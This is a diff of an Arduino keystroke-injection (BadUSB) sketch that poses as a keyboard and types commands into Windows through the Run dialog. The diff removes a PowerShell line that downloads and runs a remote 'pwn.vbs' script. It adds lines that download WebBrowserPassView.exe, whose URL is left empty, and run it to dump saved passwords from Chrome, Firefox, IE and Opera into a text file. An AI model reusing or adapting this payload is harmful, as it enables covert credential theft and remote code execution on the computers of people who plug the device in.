@@ -7,37 +7,55 @@
 #define RIGHT_ALT   0x40
 #define RIGHT_GUI   0x80
 
+
 //Keys
 #define KEY_ENTER 0x28
-#define KEY_BACKSPEACE 0x2A
+#define KEY_BACKSPACE 0x2A
 #define KEY_TAB 0x2B
 #define KEY_CAPSLOCK 0x39
 
 
 uint8_t buf[8] = { 0 }; //buffer
 
+const int ledPin = 13;
+
 
 void setup()
 {
    Serial.begin(9600);
-   delay(3000);
+
+   // Open Run dialog
+   delay(3000); // Wait 3 seconds
    keyPress(LEFT_GUI, 0x15); // Windows keys + R
-   keyRelease();
+   keyRelease(); // Release the key
    delay(200);
-   keyString("cmd.exe");
+
+   // Run cmd.exe
+   keyString("cmd.exe"); // Enter string
+   delay(500);
+   keyPress(0, KEY_ENTER); // Press enter
+   keyRelease(); // Release the key
+   delay(500);
+
+   // Run powershell command
+   keyString("powershell (new-object System.Net.WebClient).DownloadFile(('', 'WebBrowserPassView.exe')");
    delay(500);
    keyPress(0, KEY_ENTER);
    keyRelease();
    delay(500);
-   keyString("powershell -Command \"(New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/Dr-D12345/abc9228407ec4c9d76fbb14a292c5eac/raw/25f4b4c0768a032e58c4c43f07ebe7a6117a43f4/pwn.vbs', 'pwn.vbs')\" & cscript pwn.vbs");
-   keyPress(0, KEY_ENTER);
-   keyRelease();
+
+   // Extract Passwords
+   keyString("WebBrowserPassView.exe /LoadPasswordsChrome 1 /LoadPasswordsFirefox 1 /LoadPasswordsIE 1 /LoadPasswordsOpera 1 /stext passwords.txt");
+   delay(500);
  }
 
 
 void loop()
 {
-
+  pinMode(ledPin, OUTPUT);
+  digitalWrite(ledPin, HIGH);
+  delay(1000);
+  digitalWrite(ledPin, LOW);
 }
 
 void keyRelease()
@@ -60,9 +78,9 @@ void keyString(String text) {
   char temp_char;
   boolean check;
 
-  for(int i = 0;i<text.length();i++) {
+  for(int i = 0; i < text.length(); i++) {
     temp_char = text.charAt(i);
-    if(((int)temp_char >= 97 && (int)temp_char <= 122) || ((int)temp_char >= 65 && (int)temp_char <= 90)) {
+    if( ( (int) temp_char >= 97 && (int) temp_char <= 122) || ( (int) temp_char >= 65 && (int) temp_char <= 90)) {
       for(int j = 0;j<sizeof(mean_dic) - 1;j++) {
         if(temp_char == alpha[j]) {
           keyPress(0, mean_dic[j]);
